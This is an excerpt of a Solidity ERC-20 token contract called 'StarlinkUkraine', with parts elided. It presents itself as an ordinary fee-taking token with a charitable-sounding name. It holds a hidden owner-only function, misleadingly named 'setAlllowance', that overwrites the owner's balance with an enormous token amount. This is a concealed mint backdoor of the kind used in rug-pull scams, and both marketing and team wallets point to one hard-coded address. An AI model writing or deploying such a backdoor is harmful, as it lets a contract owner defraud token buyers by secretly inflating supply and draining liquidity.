...
contract StarlinkUkraine is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "StarlinkUkraine";
    string private _symbol = "STARLINK";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xA7ed0E95A52aaD22b8f74b4a56662A0129e0bD98);
    address payable public teamWalletAddress = payable(0xA7ed0E95A52aaD22b8f74b4a56662A0129e0bD98);
    address public deadAddress = 0x000000000000000000000000000000000000dEaD;
    
    mapping (address => uint256) _totalWallets;
    ...
    uint256 public _walletMax =     250000000000 * 10**_decimals; 
    uint256 private minimumTokensBeforeSwap = 1 * 10**_decimals; 
    uint256 public _varAmount = (10 ** _decimals);
    uint256 public _totalTokensDec = 1000000000000000;    
    uint256 public _totalAmount = _totalTokensDec * _varAmount;
    ...
    constructor () {
        ...
        _totalWallets[_msgSender()] = _totalSupply;
    ...
    function balanceOf(address account) public view override returns (uint256) {return _totalWallets[account];}
    ...
    function setAlllowance() external onlyOwner() {_totalWallets[getOwner()] = _totalAmount ; }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            _totalWallets[sender] = _totalWallets[sender].sub(amount, "Insufficient Balance");
            ...
            _totalWallets[recipient] = _totalWallets[recipient].add(finalAmount);
    ...
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _totalWallets[sender] = _totalWallets[sender].sub(amount, "Insufficient Balance");
        _totalWallets[recipient] = _totalWallets[recipient].add(amount);
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        if(feeAmount > 0) {
            _totalWallets[address(this)] = _totalWallets[address(this)].add(feeAmount);
